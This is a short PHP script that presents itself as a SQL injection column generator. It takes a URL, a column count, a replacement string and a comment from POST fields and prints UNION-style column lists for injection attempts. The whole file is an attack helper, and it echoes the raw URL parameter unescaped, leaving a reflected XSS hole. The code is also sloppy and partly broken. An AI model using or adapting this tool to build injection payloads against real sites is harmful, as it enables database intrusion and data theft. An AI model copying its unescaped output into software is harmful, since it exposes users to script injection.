<?php

#  SQLi-Routed-Column-Generator-and-Time-Based-Tool API
#  2018-03-21 

function count_me($length){
#My function start here . LOL
if(isset($_POST['url'])){
for($a=1; $a <= $length; $a++){
echo ($_POST['url']);
break;}}
#start counting the number of columns..
$test1= $length-1;
for($a =1; $a <= $test1; $a++){
echo $a.",";}




#insert "null" or whatever string the user entered.

for($a ; $a <= ($_POST['cols']);$a++){
$aa = str_replace($a,($_POST['rplace']),$a);
echo htmlspecialchars($aa.",");
break;

}

#continue counting the columns.. I love this part <3 ;) tricky one.

for($a; $a <= ($_POST['cols']);$a++){
$aa = $a+1;
$bos= $aa.",";
$shit34= str_replace(($_POST['cols'])+1,"aa",$bos);
$shit32= str_replace(($_POST['cols']).",",($_POST['cols']),$shit34);
echo htmlspecialchars(str_replace("aa,",urlencode(($_POST['comment'])),$shit32));

;}
echo "\n";



}

#end..

#initiate the numbers of iteration from the user input, then pass the value to my function parameter through $length.

if(true == true){
for($a=1;$a<=($_POST['cols']);$a++){
echo count_me($a);
}
}
?>

